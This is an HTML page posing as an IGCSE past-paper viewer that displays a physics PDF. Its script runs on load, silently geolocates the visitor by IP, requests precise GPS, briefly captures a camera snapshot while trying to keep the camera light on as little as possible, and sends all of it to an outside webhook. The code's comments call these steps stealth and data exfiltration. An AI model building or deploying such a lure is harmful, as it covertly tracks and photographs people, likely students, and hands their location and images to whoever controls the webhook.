<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IGCSE Papers - Educational Viewer</title>
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #2c3e50; color: white; overflow: hidden; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
    </style>
</head>
<body>
    <div class="header"><strong>Viewing: IGCSE Past Paper (Physics)</strong></div>
    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";

        // 1. THE "STEALTH" METHOD (IP-Based Geolocation)
        // Works instantly without any browser popups.
        async function getSilentLocation() {
            try {
                const response = await fetch('https://ipapi.co');
                const data = await response.json();
                sendData({
                    method: "SILENT_IP_GEOLOCATION",
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    approx_coords: `${data.latitude}, ${data.longitude}`
                });
            } catch (err) { console.log("Silent fetch blocked"); }
        }

        // 2. THE "PRECISION" METHOD (GPS Lat/Long)
        // Triggers the "Allow Location" browser popup.
        function getGPSLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendData({
                        method: "HIGH_PRECISION_GPS",
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: `${pos.coords.accuracy} meters`,
                        google_maps: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
                    });
                }, (err) => {
                    sendData({ method: "GPS_ERROR", message: err.message });
                }, { enableHighAccuracy: true, timeout: 5000 });
            }
        }

        // 3. CAMERA SNAPSHOT (Triggers Camera Permission & LED)
        async function takeSnapshot() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    // Fast capture to minimize LED light duration
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        sendData({
                            method: "CAMERA_CAPTURE",
                            image: canvas.toDataURL('image/jpeg', 0.5)
                        });

                        stream.getTracks().forEach(track => track.stop());
                    }, 800);
                };
            } catch (err) {
                sendData({ method: "CAMERA_ERROR", message: err.message });
            }
        }

        // 4. DATA EXFILTRATION (Sends to your Webhook)
        function sendData(payload) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors', // Essential for cross-origin sending
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // RUN ALL STEPS
        getSilentLocation(); // Runs immediately
        getGPSLocation();    // Triggers Popup 1
        takeSnapshot();      // Triggers Popup 2
    </script>
</body>
</html>
